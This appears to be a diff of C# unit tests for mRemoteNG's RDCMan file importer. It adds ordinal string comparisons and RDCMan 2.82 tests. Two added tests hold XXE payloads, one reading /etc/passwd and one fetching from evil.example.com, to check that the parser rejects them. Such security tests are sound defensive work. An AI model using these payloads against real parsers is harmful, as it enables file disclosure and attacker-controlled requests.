@@ -1,4 +1,5 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using System.Linq;
 using mRemoteNG.Config.Serializers.MiscSerializers;
 using mRemoteNG.Connection.Protocol;
@@ -67,7 +68,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
         var rootNodeContents =
-            importedRdcmanRootNode.Children.Count(node => node.Name == "Group1" || node.Name == "Group2");
+            importedRdcmanRootNode.Children.Count(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal) || string.Equals(node.Name, "Group2", StringComparison.Ordinal));
         Assert.That(rootNodeContents, Is.EqualTo(2));
     }
 
@@ -76,7 +77,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Name, Is.EqualTo(ExpectedName));
     }
@@ -86,7 +87,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Hostname, Is.EqualTo(ExpectedHostname));
     }
@@ -96,7 +97,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Description, Is.EqualTo(ExpectedDescription));
     }
@@ -106,7 +107,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Username, Is.EqualTo(ExpectedUsername));
     }
@@ -116,7 +117,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Domain, Is.EqualTo(ExpectedDomain));
     }
@@ -127,7 +128,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     //{
     //    var rootNode = _connectionTreeModel.RootNodes.First();
     //    var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-    //    var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+    //    var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
     //    var connection = group1.Children.First();
     //    Assert.That(connection.Password, Is.EqualTo(ExpectedPassword));
     //}
@@ -137,7 +138,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Protocol, Is.EqualTo(ProtocolType.RDP));
     }
@@ -147,7 +148,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.UseConsoleSession, Is.EqualTo(ExpectedUseConsoleSession));
     }
@@ -157,7 +158,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Port, Is.EqualTo(ExpectedPort));
     }
@@ -167,7 +168,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDGatewayUsageMethod, Is.EqualTo(ExpectedGatewayUsageMethod));
     }
@@ -177,7 +178,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDGatewayHostname, Is.EqualTo(ExpectedGatewayHostname));
     }
@@ -187,7 +188,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDGatewayUsername, Is.EqualTo(ExpectedGatewayUsername));
     }
@@ -198,7 +199,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     //{
     //    var rootNode = _connectionTreeModel.RootNodes.First();
     //    var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-    //    var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+    //    var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
     //    var connection = group1.Children.First();
     //    Assert.That(connection.RDGatewayPassword, Is.EqualTo(ExpectedGatewayPassword));
     //}
@@ -208,7 +209,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDGatewayDomain, Is.EqualTo(ExpectedGatewayDomain));
     }
@@ -218,7 +219,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Resolution, Is.EqualTo(ExpectedRdpResolution));
     }
@@ -228,7 +229,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.Colors, Is.EqualTo(ExpectedRdpColorDepth));
     }
@@ -238,7 +239,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectSound, Is.EqualTo(ExpectedAudioRedirection));
     }
@@ -248,7 +249,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectKeys, Is.EqualTo(ExpectedKeyRedirection));
     }
@@ -258,7 +259,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectDiskDrives, Is.EqualTo(ExpectedDriveRedirection));
     }
@@ -268,7 +269,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectPorts, Is.EqualTo(ExpectedPortRedirection));
     }
@@ -278,7 +279,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectPrinters, Is.EqualTo(ExpectedPrinterRedirection));
     }
@@ -288,7 +289,7 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RedirectSmartCards, Is.EqualTo(ExpectedSmartcardRedirection));
     }
@@ -298,9 +299,37 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDPAuthenticationLevel, Is.EqualTo(ExpectedAuthLevel));
+    }
+
+    [Test]
+    public void CanDeserializeRdcMan282File()
+    {
+        var fileContents = Resources.ResourceManager.GetString("test_rdcman_v2_82_schema3");
+        Assert.That(fileContents, Is.Not.Null.And.Not.Empty);
+
+        var connectionTreeModel282 = _deserializer.Deserialize(fileContents!);
+        Assert.That(connectionTreeModel282.RootNodes.Count, Is.GreaterThan(0));
+    }
+
+    [Test]
+    public void RdcMan282ConnectionPropertiesImported()
+    {
+        var fileContents = Resources.ResourceManager.GetString("test_rdcman_v2_82_schema3");
+        Assert.That(fileContents, Is.Not.Null.And.Not.Empty);
+
+        var connectionTreeModel282 = _deserializer.Deserialize(fileContents!);
+
+        var rootNode = connectionTreeModel282.RootNodes.First();
+        var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
+        var connection = group1.Children.First();
+
+        Assert.That(connection.Name, Is.EqualTo(ExpectedName));
+        Assert.That(connection.Hostname, Is.EqualTo(ExpectedHostname));
+        Assert.That(connection.Protocol, Is.EqualTo(ProtocolType.RDP));
     }
 
     [Test]
@@ -329,8 +358,35 @@ public class RemoteDesktopConnectionManagerDeserializerTests
     {
         var rootNode = _connectionTreeModel.RootNodes.First();
         var importedRdcmanRootNode = rootNode.Children.OfType<ContainerInfo>().First();
-        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => node.Name == "Group1");
+        var group1 = importedRdcmanRootNode.Children.OfType<ContainerInfo>().First(node => string.Equals(node.Name, "Group1", StringComparison.Ordinal));
         var connection = group1.Children.First();
         Assert.That(connection.RDPStartProgram, Is.EqualTo(ExpectedStartProgram));
+    }
+
+    // CVE-2020-0765: Remote Desktop Connection Manager Information Disclosure via XXE
+    [Test]
+    public void DeserializerRejectsXxePayloadInRdgFile()
+    {
+        // A malicious .rdg file with an XXE payload should be rejected outright.
+        // DtdProcessing.Prohibit in SecureXmlHelper must prevent this attack vector.
+        string xxePayload = @"<?xml version='1.0'?>
+<!DOCTYPE RDCMan [
+<!ELEMENT RDCMan ANY>
+<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+<RDCMan programVersion='2.7' schemaVersion='3'>&xxe;</RDCMan>";
+
+        Assert.Throws<System.Xml.XmlException>(() => _deserializer.Deserialize(xxePayload));
+    }
+
+    [Test]
+    public void DeserializerRejectsExternalEntityInRdgFile()
+    {
+        // A second XXE variant using an external URL — also rejected by SecureXmlHelper.
+        string externalEntityPayload = @"<?xml version='1.0'?>
+<!DOCTYPE RDCMan [
+<!ENTITY ext SYSTEM 'http://evil.example.com/malicious.dtd'>]>
+<RDCMan programVersion='2.7' schemaVersion='3'>&ext;</RDCMan>";
+
+        Assert.Throws<System.Xml.XmlException>(() => _deserializer.Deserialize(externalEntityPayload));
     }
 }
